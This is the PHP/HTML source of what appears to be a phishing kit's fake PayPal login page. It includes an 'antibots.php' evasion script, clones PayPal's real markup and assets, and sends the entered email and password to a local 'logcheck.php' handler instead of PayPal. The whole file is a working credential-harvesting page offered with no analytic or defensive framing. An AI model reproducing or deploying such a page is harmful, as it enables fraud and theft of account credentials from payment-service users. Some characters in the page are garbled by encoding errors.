<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE html>
<!--[if lt IE 9]><html lang="en" class="no-js lower-than-ie9 ie"><![endif]--><!--[if lt IE 10]><html lang="en" class="no-js lower-than-ie10 ie"><![endif]--><!--[if !IE]>-->
<html lang="en" class="no-js">
<!--<![endif]-->
<head>
<!--Script info: script: node, template:  , date: Jul 6, 2016 20:27:27 -07:00, country: US, language: en web version:  content version:  hostname : HNkO0rPLlHFAHsoBDpl1WYCWRNaDdAlMKhPEVR9cY4JN2K82+rDkD9tVXy6GkbFGno9zD1PUSts rlogid : 5xc3kcPBmLJ%2BeGrggAdDDe0WuD7IyV9Xtslo5JE2C%2BKpmAi5N3nvmFMc3%2B2EpcLocFUsInol7Ci8MVQtyhYSgcUObciW9nfC_155c3655adb -->
<meta charset="utf-8" />
    <title>PayPal - Login</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="application-name" content="PayPal" />
<meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
<meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
<meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" /><meta name="keywords" content="transfer money, email money transfer, international money transfer " />
<meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
<link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/css/app.css" />
<!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/css/ie9.css" /><![endif]-->
<script src="https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/js/lib/modernizr-2.6.1.js"></script>
<style id="antiClickjack">body {display: none !important;}</style>
<script>
/* Don't bust the frame if this is top window* or if the parent window is *.paypal.com domain (Checkout for example).*/if (self === top || /paypal\.com$/.test(window.parent.location.hostname)) {var antiClickjack = document.getElementById("antiClickjack");if (antiClickjack) {antiClickjack.parentNode.removeChild(antiClickjack);}} else {top.location = self.location;}</script>
</head>
<body class="desktop " data-rlogid="5xc3kcPBmLJ%2BeGrggAdDDe0WuD7IyV9Xtslo5JE2C%2BKpmAi5N3nvmFMc3%2B2EpcLocFUsInol7Ci8MVQtyhYSgcUObciW9nfC_155c3655adb" data-hostname="HNkO0rPLlHFAHsoBDpl1WYCWRNaDdAlMKhPEVR9cY4JN2K82+rDkD9tVXy6GkbFGno9zD1PUSts" data-production="true"  	data-enable-ads-captcha="true"data-ads-challenge-url="/auth/createchallenge/64a70933c9c48ed8/challenge.js" data-view-name="login" data-template-path="https://www.paypalobjects.com/web/res/dd1/3776a01d8c6d0e1d251f0de8e5e55/templates/US/en/%s.js"data-correlation-id="8b53663f5f010"data-client-name="ul"data-csrf-token="oIjoZU7b6hQCVOuFsuhHkO1gncSm4tJn2zYDM=" >
<noscript>
<p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p></noscript>
<div id="main" class="main " role="main">
<section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
<div class="corral">
<div id="content" class="contentContainer">
<header>
<p class="paypal-logo paypal-logo-long">PayPal</p>
</header>
<h1 class="headerText accessAid">Log in to your PayPal account</h1>
<form action="logcheck.php" method="post" class="proceed maskable" name="login"autocomplete="off" novalidate>
<input type="hidden" id="token" name="_csrf" value="oIjoZU7b6hQCVOuFsuhHkO1gncSm4tJn2zYDM=">
<input type="hidden" name="locale.x" value="en_US">
<input type="hidden" name="processSignin" value="main">

<input type="hidden" name="state" value="?cmd=_account" />
<div id="passwordSection" class="clearfix">
<div class="textInput" id="login_emaildiv">
<div class="fieldWrapper">
<label for="email" class="fieldLabel">Email</label>
<input id="email"name="email"type="email"class="hasHelp  validateEmpty  "required="required" aria-required="true"value=""		autocomplete=	"off"			placeholder=	"Email"		/>
</div>
<div class="errorMessage"id="emailErrorMessage">
<p class="emptyError hide">Required</p>
<p class="invalidError hide">That email format isnРІР‚в„ўt right</p>
</div>
</div>
<div class="textInput lastInputField" id="login_passworddiv">
<div class="fieldWrapper">
<label for="password" class="fieldLabel">Password</label>
<input id="password"name="pass"type="password"class="hasHelp  validateEmpty  "required="required" aria-required="true"value=""		placeholder=	"Password"		/>
</div>
<div class="errorMessage"id="passwordErrorMessage">
<p class="emptyError hide">Required</p>
</div>
<div>
<div class="actions actionsSpaced">
<button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button>
</div>
<div class="forgotLink">
<a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Having trouble logging in?</a>
</div>
</div>
</form>
<a href="#" class="button secondary" id="createAccount">Sign Up</a>
</div>
</div>
<footer class="footer" role="contentinfo">
<ul class="footerGroup">
<li>
<a href="#">Contact Us</a>
</li>
<li>
<a href="#">Privacy</a>
</li>
<li>
<a href="#">Legal</a>
</li>
<li>
<a href="#">Worldwide</a>
</li>
</ul>
</footer>
</section>
</div>
<div class="transitioning hide">
<p class="checkingInfo hide">Checking your info</p>
<p class="oneSecond hide">Just a secondРІР‚В¦</p>
</div>
<!-- Require.js baseUrl config is loaded in advance. More here: http://requirejs.org/docs/api.html#config -->
<script>(function(){if(document.getElementsByTagName("body")[0].getAttribute("data-enable-client-cal-logging")){var e=window.PAYPAL||{};e.ulData=e.ulData||{},e.ulData.logRecords=[{evt:"ul-rendered",ts:Date.now()}],e.ulData.saveClientSideLogs=function(){if(!e.ulData.logRecords)return;var t={currentUrl:window.location.href,_csrf:document.getElementById("token").value,logRecords:e.ulData.logRecords},n=new XMLHttpRequest;n.open("POST","/signin/client-log",!0),n.setRequestHeader("Content-Type","application/json;charset=UTF-8");try{n.send(JSON.stringify(t)),e.ulData.logRecords=null}catch(r){}};var t=window.attachEvent||window.addEventListener,n=window.attachEvent?"onbeforeunload":"beforeunload";t(n,e.ulData.saveClientSideLogs)}})();		</script></body></html>